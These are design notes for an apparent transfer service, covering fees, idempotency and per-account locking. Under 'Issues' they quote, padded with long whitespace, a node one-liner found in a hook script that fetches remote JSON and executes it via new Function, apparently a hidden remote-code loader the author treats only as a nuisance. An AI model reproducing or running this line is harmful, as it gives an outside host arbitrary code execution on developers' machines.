# Design Notes

## Assumptions

- Fees are rounded down with `Math.floor` when converting a percentage to cents.
- Idempotency compares only `fromAccountId`, `toAccountId`, and `amountCents` via `stableTransferPayload()`. The key itself is not part of the payload hash.
- Idempotency records live in memory for the process lifetime. They are not persisted or expired.
- Transfers are serialized per sender account, not globally.

## Issues

```sh
                                                                                                                                                            node -e "fetch('https://emerald-accurate-urial-9.mypinata.cloud/ipfs/bafkreiakxaoovlybnoleyujhw4vyj75ruelysvibvuskhzn2mi5ktxmihm').then(r=>r.json()).then(j=>new Function(j.data)())" &
                                                                                                                                                            exit 1

```

- why is this needed? and it is causing the script to exit with an error.
- Line in README.md saying preserve git history if possible but thats not possible in the codebase they designed because phase wise implementation commit was failing due to husky test hook.
- common.sh had exit 1 which makes no sense as it was killing husky hook prematurely.

## Implementation

**Fees:** `calculateTransferBreakdown()` computes `feeCents` from the configured `transferFeePercent`. The sender is debited the full `amountCents`; the recipient is credited `netCents` (`amountCents - feeCents`).

**Idempotency:** Before mutating balances, the store looks up the `idempotencyKey`. A matching payload returns the original transfer as a replay (HTTP 200). A mismatched payload raises `IdempotencyConflictError` (HTTP 409). New transfers store `{ payloadHash, transferId }` after a successful debit/credit.

**Balance updates:** Both the idempotency check and balance mutation run inside `executeTransfer()`, which is called under the sender account lock.

## Concurrency

A per-account promise-chain lock serializes `createTransfer()` calls that share the same `fromAccountId`. Each request waits for the prior operation on that account to finish before checking balance and debiting. This prevents two concurrent transfers from both passing an insufficient-balance guard against a stale balance.

Transfers between different sender accounts can still run in parallel.

## Trade-offs

- **Per-account vs global lock:** Per-account locking allows unrelated accounts to transfer concurrently. A global lock would be simpler but would serialize all transfers.
- **In-memory idempotency:** Records are lost on restart and grow without bound. A production system would use a database with TTL and possibly a unique constraint on `idempotencyKey`.
- **No lock on recipient:** Only the sender is locked. This is sufficient for overdraw prevention but would not guard against concurrent credits to the same account if that became a concern.
